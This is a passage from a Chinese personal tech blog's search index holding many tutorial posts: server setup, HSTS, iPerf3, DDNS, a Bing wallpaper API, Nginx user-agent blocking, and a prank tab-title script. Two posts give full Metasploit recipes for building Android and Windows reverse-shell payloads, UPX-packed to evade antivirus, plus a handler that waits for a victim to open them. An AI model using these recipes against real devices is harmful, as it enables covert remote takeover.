return true; } catch (e){ return false; }}","link":"/Blog/2020/09/07/%E4%BD%BF%E7%94%A8JS%E5%B1%8F%E8%94%BDF12-%E5%8F%B3%E9%94%AE-%E5%A4%8D%E5%88%B6%E4%B8%8E%E6%9F%A5%E7%9C%8B%E6%BA%90%E4%BB%A3%E7%A0%81/"},{"title":"使用Metasploit远控你的手机","text":"安装MetaSploit 我的环境是:Kubuntu20.04 一键脚本: 1curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall 然后就无了 生成一个远控程序12345678msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\\x00’ LHOST=10.0.0.155 LPORT=52130 -f exe &gt; test.apk-p 攻击载荷-e 编码方式-i 编码次数-b 在生成的程序中避免出现的值LHOST,LPORT 监听上线的主机IP和端口-f exe 生成EXE格式 我们已经成功创建了Android格式（APK）文件的有效载荷。现在一般Android的移动设备不允许安装没有适当签名证书的应用程序。 Android设备只安装带有签署文件的APK。 我们可以使用如下工具进行手动签名： Keytool (已安装)jarsigner (需要安装)zipalign (需要安装) 执行下列命令签名。首先使用密钥工具创建密钥库。 1keytool -genkey -v -keystore my-release-key.Keystore -alias wdnmd -keyalg RSA -keysize 2048 -validity 10000 然后使用JARsigner签名APK 12345apt install openjdk-14-headless #安装Javajarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.Keystore test.apk wdnmd #签名APKjarsigner -verify -verbose -certs test.apk #验证签名 使用zipalign优化APK 12apt install zipalign #安装zipalignzipalign -v 4 test.apk NEWtest.apk #使用Metasploit进行测试接下来启动metasploit的监听器。执行msfconsole打开控制台 12345use exploit/multi/handlerset payload android/meterpreter/reverse_tcpset lhost 10.0.0.155set lport 52130exploit 如有人打开**NEWtest.apk(MainActivity.apk)**时，则会出现等待输入界面 1meterpreter &gt; 输入help获得帮助","link":"/Blog/2020/09/15/%E4%BD%BF%E7%94%A8Metasploit%E8%BF%9C%E6%8E%A7%E4%BD%A0%E7%9A%84%E6%89%8B%E6%9C%BA/"},{"title":"使用Metasploit远控你的电脑","text":"安装MetaSploit 我的环境是:Kubuntu20.04 一键脚本: 1curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; chmod 755 msfinstall &amp;&amp; ./msfinstall 然后就无了 生成一个远控程序12345678msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\\x00’ LHOST=10.0.0.155 LPORT=52130 -f exe &gt; test.exe-p 攻击载荷-e 编码方式-i 编码次数-b 在生成的程序中避免出现的值LHOST,LPORT 监听上线的主机IP和端口-f exe 生成EXE格式 使用upx加壳做免杀处理，命令如下1234#安装upxhttps://github.com/upx/upx/releases/tag/v3.95#加壳upx -9 test.exe 开始远控 启动Metasploit1msfconsole 在msf下输入1use exploit/multi/handler 查看需要设置的参数1show options 设置payload1set PAYLOAD windows/meterpreter/reverse_tcp 设置LHOST，LPORT12set lhost 10.0.0.155set lport 52130 启动程序1exploit 如有人打开test.exe，则会出现等待输入界面1meterpreter &gt; 现在我们可以输入help来看具体可以远程做些什么了 #我是废物","link":"/Blog/2020/09/15/%E4%BD%BF%E7%94%A8Metasploit%E8%BF%9C%E6%8E%A7%E4%BD%A0%E7%9A%84%E7%94%B5%E8%84%91/"},{"title":"使用RaiDrive将网盘映射为本地磁盘","text":"你是不是也想拥有别人那样的TB甚至EB的本地磁盘呢？这边为你提供一个实现这个想法的教程——通过Raidrive将网盘映射为本地磁盘。RaiDrive是一款开源的网盘映射工具，支持Google Drive、Google Photos、Dropbox、OneDrive、FTP、SFTP、WebDAV，该工具目前只有Windows版本。 ##注册网盘账号现在用的比较多的就是Google Drive和OneDrive，但是国内如果你不会科学上网的话，Google Drive是用不了的。推荐使用Onedrive速度虽然不快但还是可以的。帐号的话大学应该都有提供学校的教育邮箱，去微软官网申请账号可以获得1T的容量。 ##下载与安装可以前往RaiDrive官网下载最新版本安装。如果觉得下载慢可以直接使用博主提供的蓝奏云下载，目前是最新版本，以后出了新版本也一样可以先下载这个版本，之后在软件中点击升级。 ##连接网盘与映射由于Google服务在国内无法访问，需要代理，并不是所有人都适合，所以这篇文章以OneDrive为例。 下载安装完成之后，打开软件应该是英文的，点击右上角的设置，先将语言改为中文以便你的连接与映射。 添加网盘 登录OneDrive账号输入账号密码并登录 授权RaiDrive登陆账号后跳转到一个链接，RaiDrive请求征得许可，点击接受。 连接成功提示RaiDrive将OneDrive连接到驱动器就成功了。 ##总结这样就拥有了大容量的本地磁盘，速度方便的话OneDrive还可以但也不快，不过用来在朋友面前装一下也是可以的哈哈哈。最后OneDrive的网盘当你用了超过90%可以免费升级25T，简便的方法就是先传个几十M的文件进去，然后复制粘贴，网速快的话十几分钟就能完成。","link":"/Blog/2020/06/30/%E4%BD%BF%E7%94%A8RaiDrive%E5%B0%86%E7%BD%91%E7%9B%98%E6%98%A0%E5%B0%84%E4%B8%BA%E6%9C%AC%E5%9C%B0%E7%A3%81%E7%9B%98/"},{"title":"使用UUPDL脚本下载Win10任意版本(含最新测试版)的镜像文件","text":"前言国内多数用户下载微软操作系统和软件都使用 MSDN.ITELLYOU.CN，该站点知名度口碑较好且提供官方原本镜像。只不过镜像更新依靠站长下载做种分发因此速度可能不是那么快，同时通过磁力链接下载速度相对来说有些慢。另外我们全新安装系统的话肯定想要安装集成最新更新的版本，这样不需要在安装后再去系统更新里检查和下载。此外对于Windows10测试版微软通常不会直接提供镜像，如果想要通过虚拟机进行体验的话下载过程有些麻烦。所以在这篇文章里我们给大家介绍通过UUPDL脚本下载任意版本镜像的方法，下载速度极快想要体验也更方便。 介绍###什么是UUPDL脚本：UUPDL是国外开发者基于微软API接口开发的工具，后来开发者觉得更新工具很麻烦不如简化操作步骤，于是直接将UUPDL的相关组件换成脚本形式通过CMD执行。换成脚本形式后的好处在于用户不需要下载工具，只需在其网站选择自己需要的版本，然后自动生成脚本工具包。运行工具包里的命令提示符工具即可执行下载和.ISO镜像打包服务，该工具使用几乎没有难度人人均可轻松上手。 使用前###你需要了解Windows10版本号：使用该工具唯一有点难度的就是需要了解Windows10繁杂的版本号，因为明白版本号后才能知道自己下载什么。比如当前微软官方正式版通道最新版是Windows10 Version 1909，该版本的小版本号为Build 18363.xxx系列。即将推出的Windows10 Version 2004 (即20H1版) 目前还属于测试阶段 , 其小版本号为Build 19041.xxx系列。了解这些版本号后你才能通过UUPDL脚本下载镜像文件,理论上说也支持下载旧版只要你知道对应版本号即可。 实战比如我们现在需要下载集成2020年4月累积更新的Windows10 Version 1909也被称为19H2版的最新镜像文件。我们需要在搜索框里输入19H2或者是1909之类的版本关键词，然后在返回的列表里查找我们需要的微架构体系。接下来选择语言和版本集成，语言默认中文即可不需要修改，版本如无特殊需要的话也默认配置的消费者版即可。[notice]注意：如果你只需要专业版那可以把家庭版和家庭中文版去掉，这样可以缩短镜像文件下载和创建的整体时间等。[/notice]当工具包下载后请将其完整解压到桌面然后运行里面的脚本，具体脚本对应的操作系统说明可以看描述。 Windows: aria2_download_windows.cmd Linux: aria2_download_linux.sh macOS: aria2_download_macos.sh###UUPDL脚本工具包下载地址：官方网站：UUPDL 用户加载此网站然后按上面的步骤搜索自己需要的版本再创建脚本工具包即可。 友情提示：由于网络原因国内用户访问该网站速度较慢或者创建脚本工具包时可能无法下载如遇此问题请重试。 镜像位置：使用此工具创建的 Windows10 .ISO镜像保存在工具包解压后的文件夹里,请打开解压文件夹查看。 无企业版：此工具仅支持下载专业版、家庭版、家庭中国版、教育零售版、专业工作版,不支持企业系列的版本。 安全说明：此工具不含任何捆绑、相关镜像资源均直接通过微软服务器下载，所以下载速度也可以直接跑满宽带。 教程反馈：如对本文教程有不明白的地方或者自己操作出现其他问题，可以在本文评论中留言看到会及时解答的。 教程就到此结束啦!本博客文章均为原创，转载请注明来源","link":"/Blog/2020/04/29/%E4%BD%BF%E7%94%A8UUPDL%E8%84%9A%E6%9C%AC%E4%B8%8B%E8%BD%BDWin10%E4%BB%BB%E6%84%8F%E7%89%88%E6%9C%AC(%E5%90%AB%E6%9C%80%E6%96%B0%E6%B5%8B%E8%AF%95%E7%89%88)%E7%9A%84%E9%95%9C%E5%83%8F%E6%96%87%E4%BB%B6/"},{"title":"在VPS上搭建LNMP环境","text":"本文将介绍如何使用第三方源在 Debian Buster 发行版安装最新版 LNMP宝塔是什么辣鸡？（本文 LNMP 安装过程严重参考兽兽大佬的**这篇博客**。Debian 8 请点进去自己举一反三。） 首先我们需要一台运行 Debian 10 发行版的服务器，请尽量选择内存大于 2G 性能充足的机器（放面板还舍不得用好机器？）我们需要依次安装 Nginx + PHP + Percona Server（MySQL 的开源替代品）。[notice]请先使用su root命令进入root用户后再执行一下操作[/notice] #0x00 准备工作##0x01 更新系统并安装必要软件包 12apt update &amp;&amp; apt upgrade -yapt install -y curl vim wget unzip apt-transport-https lsb-release ca-certificates git gnupg2 ##0x02 加入 Backports 源方便安装更新的软件 123456cat &gt;&gt; /etc/apt/sources.list.d/backports.list &lt;&lt; EOFdeb http://deb.debian.org/debian $(lsb_release -sc)-backports maindeb-src http://deb.debian.org/debian $(lsb_release -sc)-backports mainEOFapt -t $(lsb_release -sc)-backports update &amp;&amp; apt -y -t $(lsb_release -sc)-backports upgrade ##0x03 设置当前系统时间为中国上海(UTC+8) 1timedatectl set-timezone Asia/Shanghai ##0x04 重启系统由于更新了内核，我们需要重启才能用上新的内核 1reboot #0x10 安装 Nginx-Mainline我们使用 Ondřej Surý 大神打包好的 Nginx 源，附带了常用的各种工具。 ##0x11 添加 Nginx 源 1234wget -O /etc/apt/trusted.gpg.d/nginx-mainline.gpg https://packages.sury.org/nginx-mainline/apt.gpgcat &gt;&gt; /etc/apt/sources.list.d/nginx.list &lt;&lt; EOFdeb https://packages.sury.org/nginx-mainline/ $(lsb_release -sc) mainEOF ##0x12 屏蔽 Backports 仓库中的 Nginx 12345cat &gt;&gt; /etc/apt/preferences &lt;&lt; EOFPackage: nginx*Pin: release a=buster-backportsPin-Priority: 499EOF ##0x13 更新源信息并安装 Nginx 123apt updateapt install -y nginx-extrassystemctl enable nginx ##0x14 检查 nginx 版本无错误执行完毕之后，我们使用 nginx -v 命令检查 nginx 版本 12root@jr:~# nginx -vnginx version: nginx/1.19.0 [notice]至此Nginx安装完成[/notice] #0x20 安装 PHP同样使用 Ondřej Surý 大神打包的 PHP 源，我们选择最新的 PHP 7.4 安装。 Ondřej Surý 大佬打包的 PHP 源更是好用，Ubuntu 的 PPA for PHP 就是这位大佬做的，当然少不了 Debian 的源了。 ##0x21 添加 PHP 源 12wget -O /etc/apt/trusted.gpg.d/php.gpg https://packages.sury.org/php/apt.gpgsh -c 'echo &quot;deb https://packages.sury.org/php/ $(lsb_release -sc) main&quot; &gt; /etc/apt/sources.list.d/php.list' ##0x22 更新源信息并安装 PHP 7.4 和常用组件和部分依赖库升级 123apt updateapt install -y php7.4-fpm php7.4-mysql php7.4-curl php7.4-gd php7.4-mbstring php7.4-xml php7.4-xmlrpc php7.4-opcache php7.4-zip php7.4 php7.4-json php7.4-bz2 php7.4-bcmathapt upgrade -y [notice]提示：这里安装的 php-fpm 的重启命令为 systemctl restart php7.4-fpm[/notice][notice]至此PHP安装完成[/notice] #0x30 安装 Percona Server 8 “Percona Server 是由 Oracle 发布的最接近官方 MySQL Enterprise 发行版的版本。”Percona Server 与 MySQL 完全兼容，不必担心对接问题。 ##0x31 添加并启用 Percona Server 官方源 123wget https://repo.percona.com/apt/percona-release_latest.$(lsb_release -sc)_all.debdpkg -i percona-release_latest.$(lsb_release -sc)_all.debpercona-release setup ps80 ##0x32 安装 Percona Server 1apt install -y percona-server-server 安装过程中会弹出设置密码界面，自行设置即可。接下来会弹出加密方法选择界面。由于 MySQL 8 的最新加密方法大多数客户端不支持，所以我们这里选择第二种也就是传统加密方法。 ##0x33 检查 Percona Server 版本无错误执行完毕之后，我们使用 mysql -v 命令检查 Percona Server 版本 12root@jr:~# mysql -vmysql Ver 8.0.19-10 for debian-linux-gnu on x86_64 (Percona Server (GPL), Release '10', Revision 'f446c04') [notice]至此LNMP安装完成[/notice]","link":"/Blog/2020/07/22/%E5%9C%A8VPS%E4%B8%8A%E6%90%AD%E5%BB%BALNMP%E7%8E%AF%E5%A2%83/"},{"title":"如何在 Windows 中备份和还原注册表","text":"##手动备份注册表 按下Win+R键，键入regedit，然后按 enter 键。如果提示您输入管理员密码或进行确认，请键入密码或提供确认。 在注册表编辑器中，找到并单击您要备份的子项的注册表项。 单击文件&gt;导出。 在导出注册表文件对话框中，选择您要保存的备份副本的位置，然后在 **[文件名]**字段中键入备份文件的名称。 单击保存。 ##手动还原注册表 按下Win+R键，键入regedit，然后按 enter 键。如果提示您输入管理员密码或进行确认，请键入密码或提供确认。 在注册表编辑器中，单击文件&gt;导入。 在导入注册表文件对话框中，选择备份副本保存到的位置，选择该备份文件，然后单击打开。","link":"/Blog/2020/06/30/%E5%A6%82%E4%BD%95%E5%9C%A8-Windows-%E4%B8%AD%E5%A4%87%E4%BB%BD%E5%92%8C%E8%BF%98%E5%8E%9F%E6%B3%A8%E5%86%8C%E8%A1%A8/"},{"title":"如何编译NEWIFI3固件-Padavan(老毛子)","text":"编译前的准备工作你需要一台Linux平台的系统，这里使用Debian10 这不是废话吗！首先从Github下载你想编译的固件仓库并进入，这里使用ChongshengB的固件:链接 12git clone https://github.com/chongshengB/rt-n56u.git /opt/rt-n56u-n3cd /opt/rt-n56u-n3 安装依赖包: 1234sudo apt updatesudo apt install unzip libtool-bin curl cmake gperf gawk flex bison nano xxd sudo nano screen \\cpio git python-docutils gettext automake autopoint texinfo build-essential help2man \\pkg-config zlib1g-dev libgmp3-dev libmpc-dev libmpfr-dev libncurses5-dev libltdl-dev gcc-multilib 准备工具链 12345678cd /opt/rt-n56u-n3/toolchain-mipsel# 可以从源码编译工具链，这需要一些时间：./clean_toolchain./build_toolchain#或者下载预编译的工具链：mkdir -p toolchain-3.4.xwget https://github.com/hanwckf/padavan-toolchain/releases/download/v1.1/mipsel-linux-uclibc.tar.xztar -xvf mipsel-linux-uclibc.tar.xz -C toolchain-3.4.x 选择你需要的插件12cd trunknano build_firmware_modify 执行后会出现如下界面:如果你想使用Adbyby plus++可将下图的n改为y其他配置同上! 修改机型文件: 1nano /opt/rt-n56u/trunk/configs/templates/PSG1218.config 开始编译 修改你的固件编译时间: 1nano versions.inc 清理代码树并开始编译 123cd /opt/rt-n56u/trunksudo ./clear_treesudo ./build_firmware_modify NEWIFI3 如果觉得编译时间是在太长，不想干等着，可在编译之前执行: 1screen -S padavan 执行完后，可按下Ctrl+A+D退出该会话，恢复会话则使用: 1screen -r padavan 编译完成后,执行cd images看到你所编译的固件如想下载该固件，可以使用Python自带的软件包SimpleHTTPServer搭建文件浏览器来下载: 1python -m SimpleHTTPServer 教程就到此结束啦!本博客文章均为原创，转载请注明来源","link":"/Blog/2020/04/21/%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91NEWIFI3%E5%9B%BA%E4%BB%B6-Padavan(%E8%80%81%E6%AF%9B%E5%AD%90)/"},{"title":"开启HSTS,让你的网站评级变为A+吧！","text":"#什么是HSTS以下来自Wikipedia HSTS 可以用来抵御 SSL 剥离攻击。SSL 剥离攻击是中间人攻击的一种，由 Moxie Marlinspike 于2009年发明。他在当年的黑帽大会上发表的题为 “New Tricks For Defeating SSL In Practice” 的演讲中将这种攻击方式公开。SSL剥离的实施方法是阻止浏览器与服务器创建HTTPS连接。它的前提是用户很少直接在地址栏输入https://，用户总是通过点击链接或3xx重定向，从HTTP页面进入HTTPS页面。所以攻击者可以在用户访问HTTP页面时替换所有https://开头的链接为http://，达到阻止HTTPS的目的。 HSTS可以很大程度上解决SSL剥离攻击，因为只要浏览器曾经与服务器创建过一次安全连接，之后浏览器会强制使用HTTPS，即使链接被换成了HTTP。 另外，如果中间人使用自己的自签名证书来进行攻击，浏览器会给出警告，但是许多用户会忽略警告。HSTS解决了这一问题，一旦服务器发送了HSTS字段，用户将不再允许忽略警告。 #场景举例 当你通过一个无线路由器的免费 WiFi 访问你的网银时，很不幸的，这个免费 WiFi 也许就是由黑客的笔记本所提供的，他们会劫持你的原始请求，并将其重定向到克隆的网银站点，然后，你的所有的隐私数据都曝光在黑客眼下。 严格传输安全可以解决这个问题。如果你之前使用 HTTPS 访问过你的网银，而且网银的站点支持 HSTS，那么你的浏览器就知道应该只使用 HTTPS，无论你是否输入了 HTTPS。这样就防范了中间人劫持攻击。 [warn]如果你之前没有使用 HTTPS 访问过该站点，那么 HSTS 是不奏效的。网站需要通过 HTTPS 协议告诉你的浏览器它支持 HSTS。 服务器开启 HSTS 的方法是，当客户端通过HTTPS发出请求时，在服务器返回的 HTTP 响应头中包含Strict-Transport-Security字段。非加密传输时设置的HSTS字段无效。[/warn] #在Apache中配置HSTS编辑你的 apache 配置文件（如/etc/apache2/sites-enabled/website.conf和/etc/apache2/httpd.conf），并加以下行到你的 HTTPS VirtualHost： 12345# Optionally load the headers module:LoadModule headers_module modules/mod_headers.so&lt;VirtualHost example.com:443&gt; Header always set Strict-Transport-Security &quot;max-age=63072000; includeSubdomains; preload&quot;&lt;/VirtualHost&gt; 现在你的 web 站点在每次访问时都会发送该请求头，失效时间是两年（秒数）。这个失效时间每次都会设置为两年后，所以，明天你访问时，它会设置为明天的两年后。重启Apache #在Nginx中配置HSTSNginx很简单，将下述行添加到你的 HTTPS 配置的 server 块中： 1add_header Strict-Transport-Security &quot;max-age=63072000; includeSubdomains; preload&quot;; 重启Nginx #加入HSTS Preload ListHSTS preload list是Chrome浏览器中的HSTS预载入列表，在该列表中的网站，使用Chrome浏览器访问时，会自动转换成HTTPS。Firefox、Safari、Edge浏览器也在采用这个列表。 https://hstspreload.org/ #测试HSTS是否生效直接打开Chrome查看网络，就可以看到头部已经包含了HSTS信息了。","link":"/Blog/2020/09/09/%E5%BC%80%E5%90%AFHSTS,%E8%AE%A9%E4%BD%A0%E7%9A%84%E7%BD%91%E7%AB%99%E8%AF%84%E7%BA%A7%E5%8F%98%E4%B8%BAA+%E5%90%A7%EF%BC%81/"},{"title":"旋律的MineCraft服务器","text":"没错，屑中之屑旋律又又开服了Java Edition 1.16.2 正版服 生存!!! !!! IP：**jrn.2m.pub**","link":"/Blog/2020/08/27/%E6%97%8B%E5%BE%8B%E7%9A%84MineCraft%E6%9C%8D%E5%8A%A1%E5%99%A8/"},{"title":"用Cloudflare Worker搭建JsProxy,实现科学上网","text":"这里感谢一下Github上的这位大佬开源链接 12https://github.com/yangmyc/jsproxyhttps://github.com/yangmyc/jsproxy/tree/master/cf-worker 注册，登陆，Start building，取一个子域名，Create a Worker。复制 index.js 到左侧代码框，Save and deploy。如果正常，右侧应显示首页。收藏地址框中的https://xxxx.子域名.workers.dev，以后可直接访问。或者可以绑定自己的域名来简化长度","link":"/Blog/2020/06/30/%E7%94%A8Cloudflare-Worker%E6%90%AD%E5%BB%BAJsProxy,%E5%AE%9E%E7%8E%B0%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/"},{"title":"禁止国内屑浏览器访问","text":"最近总是有人说:“你的博客怎么打不开啊？”，“你的博客打开怎么这么慢啊？” 经过询问后，原来使用的是我们国内专业，极速的x5以及chromium75内核所以，我这边直接写Nginx规则屏蔽掉这些屑浏览器，让这些浏览器访问博客直接403 @(huaji_pc) 这里贴上屑代码: 屏蔽所有国内浏览器UA 123if ($http_user_agent ~* &quot;360|360SE|360EE|2345Explorer|maxthon|sogou|theworld|qiyu|green|qq|qqbrowser|MQQBrowser|tt|liebao|lbbrowser|tao|taobao|coolnovo|saayaa|uc|mi|xiaomi|baidu|yandex|micromessenger|wechat|weibo|douban|suning|iqiyi|alipay|ali-ap|ali-ap-pd|ali-am|ali-tb|ali-tb-pd|ali-tm|ali-tm-pd&quot;) { return 403; } 只屏蔽司马QQ的浏览器UA 123if ($http_user_agent ~* &quot;qq|qqbrowser|MQQBrowser&quot;) { return 403; } 禁止Wget下载整站 123if ($http_user_agent ~* &quot;Wget&quot;) { return 403; }","link":"/Blog/2020/09/03/%E7%A6%81%E6%AD%A2%E5%9B%BD%E5%86%85%E5%B1%91%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE/"},{"title":"离开网页时让网页标题以及logo变化","text":"1234567891011121314&lt;script&gt; document.addEventListener('visibilitychange', function () { if (document.visibilityState == 'hidden') { normal_title = document.title; document.title = 'Free Porn Videos &amp; Sex Movies - Porno,XXX,Porn Tube | Pornhub'; //替换网站title var url=&quot;URL&quot; ;//替换网站logo var link = document.querySelector(&quot;link[rel*='icon']&quot;) || document.createElement('link'); link.type = 'image/png'; link.rel = 'leave icon'; link.href = url; document.getElementsByTagName('head')[0].appendChild(link); } else document.title = normal_title;});&lt;/script&gt; 修改到TYPECHO博客主题里时，需要写入到主题header.php文件里。","link":"/Blog/2020/09/07/%E7%A6%BB%E5%BC%80%E7%BD%91%E9%A1%B5%E6%97%B6%E8%AE%A9%E7%BD%91%E9%A1%B5%E6%A0%87%E9%A2%98%E4%BB%A5%E5%8F%8Alogo%E5%8F%98%E5%8C%96/"},{"title":"纪念我玩Monster Hunter：World已经200小时啦","text":"废话不多说，冲了！ 黑龙黑龙我爱你","link":"/Blog/2020/10/19/%E7%BA%AA%E5%BF%B5%E6%88%91%E7%8E%A9Monster-Hunter%EF%BC%9AWorld%E5%B7%B2%E7%BB%8F200%E5%B0%8F%E6%97%B6%E5%95%A6/"},{"title":"网络性能测试工具IPerf3的使用","text":"iPerf3 is a tool for active measurements of the maximum achievable bandwidth on IP networks. It supports tuning of various parameters related to timing, buffers and protocols (TCP, UDP, SCTP with IPv4 and IPv6). For each test it reports the bandwidth, loss, and other parameters. This is a new implementation that shares no code with the original iPerf and also is not backwards compatible. iPerf was orginally developed by NLANR/DAST. iPerf3 is principally developed by ESnet / Lawrence Berkeley National Laboratory. It is released under a three-clause BSD license. 以下内容来自Google Translate: iPerf3是用于主动测量IP网络上可达到的最大带宽的工具。 它支持与时序，缓冲区和协议（TCP，UDP，带有IPv4和IPv6的SCTP）相关的各种参数的调整。 对于每个测试，它都会报告带宽，损耗和其他参数。 这是一个新的实现，与原始iPerf不共享任何代码，并且也不向后兼容。 iPerf最初是由NLANR / DAST开发的。 iPerf3主要由ESnet / Lawrence Berkeley国家实验室开发。 它以三条款BSD许可发布。 Linux版本下载地址：http://code.google.com/p/iperf/downloads/list 下载IPerf3大家可以从IPerf官网下载Windows版IPerf，而安卓版则可以从Google Play下载或者从我给各位大佬提供的站点下载：Windows版 安卓版 如何使用PC端如果大佬您是从我提供的站点下载的话，那么您可以直接解压压缩包所有文件并运行相对应的批处理文件辣！例如您像让您的电脑作为客户端，则运行IPerf3客户端.bat，反之，如果想让您的电脑作为服务端，则运行IPerf3服务端.bat关于PC的运行教程就到这里，下面来介绍安卓端的运行 Android端同PC端差不多，如果你想让你的Android手机作为客户端，安装您下载的iperf.apk，并打开，输入-c (你的服务端IP地址) -i (每次报告的间隔)) 点击Stopped运行即可!像这样: 我这里PC端IP为10.0.0.120，报告间隔为1s 如果想成为服务端，则输入-s -i 1点击Stopped运行即可!像这样: 意思为，将手机设为服务端报告间隔为1s 可选参数太多了懒得写自己去看Wiki别让我写求求你了好吗 教程就到此结束啦!本博客文章均为原创，转载请注明来源","link":"/Blog/2020/04/21/%E7%BD%91%E7%BB%9C%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7IPerf3%E7%9A%84%E4%BD%BF%E7%94%A8/"},{"title":"自己动手搭建必应壁纸API","text":"必应（Bing）集成了多个独特功能，包括每日首页美图，通过将来自世界各地的高质量图片设置为首页背景，美轮美奂的必应美图备很多人当做壁纸使用，今天我们自己搭建API服务自动获取每天的必应壁纸美图，搭建好的api服务可以用来作为网页背景或者其他服务调用，非常方便！ #本站Bing壁纸APIhttps://johnsonran.cn/API/bing #原理分析经过对必应首页的抓包，我们可以获得首页图的获取API。它的格式是这样的：https://cn.bing.com/HPImageArchive.aspx?format=xml&amp;idx=0&amp;n=1这里有几个GET参数，它们的作用分别是： n，必要参数。这是输出信息的数量。比如n=1，即为1条，以此类推，至多输出8条。 format，非必要。返回结果的格式，不存在或者等于xml时，输出为xml格式，等于js时，输出json格式 idx，非必要。不存在或者等于0时，输出当天的图片，-1为已经预备用于明天显示的信息，1则为昨天的图片，以此类推，idx最多获取到前16天的图片信息 这里将n设定为1、format设定为xml、idx设定为1，去发出GET请求，返回的数据是这样的： 12345678910111213141516171819202122232425262728293031323334This XML file does not appear to have any style information associated with it. The document tree is shown below.&lt;images&gt;&lt;image&gt;&lt;startdate&gt;20200907&lt;/startdate&gt;&lt;fullstartdate&gt;202009070900&lt;/fullstartdate&gt;&lt;enddate&gt;20200908&lt;/enddate&gt;&lt;url&gt;/th?id=OHR.OttoSettembre_ZH-CN7378112626_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp&lt;/url&gt;&lt;urlBase&gt;/th?id=OHR.OttoSettembre_ZH-CN7378112626&lt;/urlBase&gt;&lt;copyright&gt;瓦莱塔，马耳他 (© Deejpilot/GettyImages)&lt;/copyright&gt;&lt;copyrightlink&gt;https://www.bing.com/search?q=%E7%93%A6%E8%8E%B1%E5%A1%94&amp;form=hpcapt&amp;mkt=zh-cn&lt;/copyrightlink&gt;&lt;headline/&gt;&lt;drk&gt;1&lt;/drk&gt;&lt;top&gt;1&lt;/top&gt;&lt;bot&gt;1&lt;/bot&gt;&lt;hotspots/&gt;&lt;/image&gt;&lt;tooltips&gt;&lt;loadMessage&gt;&lt;message&gt;正在加载...&lt;/message&gt;&lt;/loadMessage&gt;&lt;previousImage&gt;&lt;text&gt;上一个图像&lt;/text&gt;&lt;/previousImage&gt;&lt;nextImage&gt;&lt;text&gt;下一个图像&lt;/text&gt;&lt;/nextImage&gt;&lt;play&gt;&lt;text&gt;播放视频&lt;/text&gt;&lt;/play&gt;&lt;pause&gt;&lt;text&gt;暂停视频&lt;/text&gt;&lt;/pause&gt;&lt;/tooltips&gt;&lt;/images&gt; 其中的“images”节点下的“url”值便是我们要获取的图像地址。我们把它取出来，再加上Bing的网址前缀(http://cn.bing.com)即组合成了完整的图像地址。比如说上面返回数据的完整图像地址是这样的： https://cn.bing.com/th?id=OHR.OttoSettembre_ZH-CN7378112626_1920x1080.jpg&amp;rf=LaDigue_1920x1080.jpg&amp;pid=hp 知道了背景图的获取方式，接下来就是用PHP去动态抓取了。 #搭建API你只需新建一个php文件，贴入如下代码： 12345678910&lt;?php$str = file_get_contents('https://cn.bing.com/HPImageArchive.aspx?idx=0&amp;n=1'); // 从bing获取数据 if(preg_match('/&lt;url&gt;([^&lt;]+)&lt;\\/url&gt;/isU', $str, $matches)) { // 正则匹配抓取图片url $imgurl = 'https://cn.bing.com'.$matches[1];} else { // 如果由于某些原因，没抓取到图片地址 $imgurl = 'https://img.infinitynewtab.com/InfinityWallpaper/2_1.jpg'; // 使用默认的图像(默认图像链接可修改为自己的)} header(&quot;Location: {$imgurl}&quot;); // 跳转至目标图像 #使用方法直接将那个php文件的绝对地址当做图片放进网页中即可。你也可以直接调用本站的必应壁纸api服务使用地址: https://johnsonran.cn/API/bing","link":"/Blog/2020/09/08/%E8%87%AA%E5%B7%B1%E5%8A%A8%E6%89%8B%E6%90%AD%E5%BB%BA%E5%BF%85%E5%BA%94%E5%A3%81%E7%BA%B8API/"},{"title":"记一次网站迁移数据库遇到500错误的解决方法","text":"前段时间因为自己备案还没下来，无法使用国内机器，只好用国外机器将就着用，也是按时备份数据库之类的，生怕像以前一样，因为自己手贱，直接把数据库删了之类的….. 几天后，备案下来了，我毫不犹豫的把美国机器dd成其他系统，跑其他项目了。 修改好数据库里的链接之类的，开始重建博客，过程中没有遇到任何困难，博客重建成功了！（怎么可能） 访问主页以及后台的时候，提示500 Server Error ， 我整个人都傻了，想了半天才知道我忘记备份插件了！之前有一次就是插件禁用时网页卡住了，我手贱刷新了一下，网站再次访问时直接500错误。所以我尝试了一下以前使用的方法: 进入数据库 找到表typecho_options(如果你的表单前缀为typecho_的话) 打开plugins 把内容修改为1a:0:{} 这时所有插件都已被禁用,访问什么的都正常了,只需要重新启用插件即可","link":"/Blog/2020/09/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%BD%91%E7%AB%99%E8%BF%81%E7%A7%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E9%81%87%E5%88%B0500%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"},{"title":"路由器中如何使用CloudFlare的DDNS","text":"前言动态 DNS（英语：Dynamic DNS，简称 DDNS）是域名系统（DNS）中的一种自动更新名称服务器（Name server）内容的技术。根据互联网的域名订立规则，域名必须跟从固定的IP地址。但动态DNS系统为动态网域提供一个固定的名称服务器（Name server），通过即时更新，使外界用户能够连上动态用户的网址。摘自 维基百科-动态DNS 当你需要使用你的域名指向一个动态 ip 时，就需要有一个支持动态 dns 的域名托管商。CloudFlare 是非常有名的域名托管商和 CDN 提供商，提供高质量的免费服务，拥有国内外大量用户。本文就将讲解如何使用 CloudFlare 实现 DDNS (动态域名解析) 开始操作CloudFlare 提供有非常强大的 API ，具体可以参看 Cloudflare API documentation v4为了实现 DDNS ，需要使 A记录指向的 IP 的能够动态变化，我们这里利用 API 进行定时操作 获取帐号信息首先要 获取你的 CloudFlare 帐号的相关信息： 邮箱就是你注册 CloudFlare 